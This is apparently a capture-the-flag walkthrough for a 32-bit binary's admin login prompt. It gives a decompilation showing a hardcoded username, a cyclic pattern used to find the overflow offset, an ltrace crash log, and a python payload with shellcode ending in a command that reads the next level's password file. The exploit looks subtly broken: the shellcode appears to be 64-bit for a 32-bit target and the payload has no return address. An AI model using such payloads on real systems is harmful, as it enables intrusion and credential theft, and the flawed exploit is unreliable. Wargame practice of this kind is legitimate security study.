
- Extract the binary file
scp -P 4242 level01@10.11.200.20:/home/users/level01/level01 bin/

- Disassemble main (on binary ninja)

```
int32_t verify_user_name()

08048469  int32_t __saved_esi
08048469  bool c = &__saved_esi u< 0x10
08048469  bool z = &__saved_esi == 0x10
08048473  puts(0x8048690)  {"verifying username....\n"}
08048482  int32_t ecx = 7
08048487  char* esi = a_user_name
08048489  char* edi = data_80486a8  {"dat_wil"}
0804848b  while (ecx != 0)
0804848b      char temp1_1 = *esi
0804848b      char temp2_1 = *edi
0804848b      *esi - *edi
0804848b      c = temp1_1 u< temp2_1
0804848b      z = temp1_1 == temp2_1
0804848b      esi = esi + 1
0804848b      edi = edi + 1
0804848b      ecx = ecx - 1
0804848b      if (not(z))
0804848b          break
080484a2  return sx.d((not(z) && not(c)) - c)
```

```
int32_t verify_user_pass(char* arg1)

080484b2  int32_t ecx = 5
080484b7  char* esi = arg1
080484b9  char* edi = data_80486b0  {"admin"}
080484bb  bool c
080484bb  bool z
080484bb  while (ecx != 0)
080484bb      char temp0_1 = *esi
080484bb      char temp1_1 = *edi
080484bb      *esi - *edi
080484bb      c = temp0_1 u< temp1_1
080484bb      z = temp0_1 == temp1_1
080484bb      esi = esi + 1
080484bb      edi = edi + 1
080484bb      ecx = ecx - 1
080484bb      if (not(z))
080484bb          break
080484bd  char* edx
080484bd  edx.b = not(z) && not(c)
080484cf  return sx.d(edx.b - c)
```

```
int32_t main(int32_t argc, char** argv, char** envp)

080484e9  void var_54
080484e9  void* edi_1 = &var_54
080484ed  for (int32_t ecx = 0x10; ecx != 0; ecx = ecx - 1)
080484ed      *edi_1 = 0
080484ed      edi_1 = edi_1 + 4
080484fe  puts(0x80486b8)  {"********* ADMIN LOGIN PROMPT ***…"}
0804850b  printf(0x80486df)  {"Enter Username: "}
08048528  fgets(0x804a040, 256, *stdin)
08048536  int32_t eax_2
08048536  if (verify_user_name() != 0)
08048544      puts(0x80486f0)  {"nope, incorrect username...\n"}
08048549      eax_2 = 1
08048557  else
08048557      puts(0x804870d)  {"Enter Password: "}
08048574      fgets(&envp, 100, *stdin)
08048580      int32_t eax_4 = verify_user_pass(&envp)
08048589      if (eax_4 == 0 || (eax_4 != 0 && eax_4 != 0))
0804859e          puts(0x804871e)  {"nope, incorrect password...\n"}
080485a3          eax_2 = 1
08048589      if (eax_4 == 0)
080485aa          eax_2 = 0
080485b5  return eax_2
```

why is this using *envp I don't comprehend

We provoke a buffer overflow with this string
```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```
eip at 0x37634136

https://wiremask.eu/tools/buffer-overflow-pattern-generator/

offset 80


----------
```
level01@OverRide:~$ ltrace -C ./level01 
__libc_start_main(0x80484d0, 1, -10300, 0x80485c0, 0x8048630 <unfinished ...>
puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********
)            = 39
printf("Enter Username: ")                             = 16
fgets(Enter Username: dat_wil
"dat_wil\n", 256, 0xf7fcfac0)                    = 0x0804a040
puts("verifying username....\n"verifying username....

)                       = 24
puts("Enter Password: "Enter Password: 
)                               = 17
fgets(BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"..., 100, 0xf7fcfac0) = 0xffffd6dc
puts("nope, incorrect password...\n"nope, incorrect password...

)                  = 29
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```
0xffffd6dc is the address where password is stored
eip will be at the next instruction and we can overwite it.

\
http://shell-storm.org/shellcode/files/shellcode-827.php

```
(python -c  '''
user = "dat_wil"
shell= "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
bomb = user + shell + "B" * (256 - len(user + shell) + 80)
print bomb
'''; whoami && cat /home/users/level02/.pass) | ./level01
```